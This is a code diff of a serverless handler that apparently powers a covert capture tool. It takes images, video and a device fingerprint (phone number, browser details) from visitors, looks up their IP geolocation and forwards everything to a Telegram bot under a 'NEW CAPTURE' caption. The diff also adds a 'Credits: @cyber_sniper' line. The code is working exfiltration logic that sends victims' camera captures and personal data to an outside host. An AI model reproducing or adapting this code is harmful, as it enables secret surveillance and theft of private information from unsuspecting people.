@@ -2,7 +2,6 @@ import fs from 'fs';
 import path from 'path';
 
 export default async function handler(req, res) {
-    // 1. Only accept POST
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
     const { type, image, video, mimeType, fingerprint, videoIndex } = req.body;
@@ -10,7 +9,6 @@ export default async function handler(req, res) {
     if (type === 'image' && !image) return res.status(400).json({ error: 'No image' });
     if (type === 'video' && !video) return res.status(400).json({ error: 'No video' });
 
-    // 2. Get config (env vars first, then files)
     let BOT_TOKEN = process.env.BOT_TOKEN;
     let CHAT_ID = process.env.CHAT_ID;
 
@@ -24,10 +22,8 @@ export default async function handler(req, res) {
         }
     }
 
-    // 3. Get client IP
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 
-    // 4. Fetch geolocation from ip-api.com (free, no key)
     let geo = {};
     try {
         const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as,query`);
@@ -39,7 +35,7 @@ export default async function handler(req, res) {
     const f = fingerprint || {};
     const videoLabel = videoIndex !== undefined ? ` (Video ${videoIndex+1})` : '';
 
-    // 5. Build the caption
+    // ✅ CREDITS ADDED HERE
     const caption = `📡 **NEW CAPTURE** ${type === 'video' ? '🎥' : '📸'}${videoLabel}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `📞 **Phone:** ${f.phone || 'N/A'}\n` +
@@ -61,9 +57,10 @@ export default async function handler(req, res) {
         `🌐 **Online:** ${f.online ? 'Yes' : 'No'}\n` +
         `🚫 **DNT:** ${f.doNotTrack || 'N/A'}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `🕒 **Captured:** ${new Date().toLocaleString()}`;
+        `🕒 **Captured:** ${new Date().toLocaleString()}\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🎯 **Credits:** @cyber_sniper`;
 
-    // 6. Build FormData
     let form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', caption);
@@ -78,7 +75,6 @@ export default async function handler(req, res) {
         form.append('video', new Blob([buffer], { type: mimeType }), `capture_${videoIndex}.${ext}`);
     }
 
-    // 7. Send to Telegram
     try {
         const endpoint = type === 'image'
             ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
